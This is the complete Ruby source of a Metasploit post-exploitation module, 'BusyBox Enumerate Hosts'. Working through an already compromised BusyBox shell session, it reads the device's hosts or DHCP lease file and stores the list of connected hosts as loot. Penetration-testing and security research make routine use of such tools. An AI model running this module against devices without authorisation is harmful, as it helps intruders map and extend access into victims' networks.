##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Busybox

  def initialize
    super(
      'Name'         => 'BusyBox Enumerate Hosts',
      'Description'  => 'This module will be applied on a session connected
                         to a BusyBox sh shell. The script will enumerate
                         the hosts connected to the router or device executing
                         BusyBox.',
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'References'   =>
        [
          [ 'URL', 'http://vallejo.cc']
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )
  end

  def run
    hosts_file = nil
    if file_exists("/var/hosts")
      hosts_file = "/var/hosts"
    elsif file_exists("/var/udhcpd/udhcpd.leases")
      hosts_file = "/var/udhcpd/udhcpd.leases"
    else
      vprint_error("Files not found: /var/hosts, /var/udhcpd/udhcpd.leases.")
      return
    end
    #File exists
    begin
      str_file=read_file(hosts_file)
      print_good("Hosts File found: #{hosts_file}.")
      vprint_line(str_file)
      #Store file
      p = store_loot("Hosts", "text/plain", session, str_file, hosts_file, "BusyBox Device Connected Hosts")
      print_good("Hosts saved to #{p}.")
    rescue EOFError
      # If there's nothing in the file, we hit EOFError
      print_error("Nothing read from file: #{hosts_file}, file may be empty.")
    end
  end

end
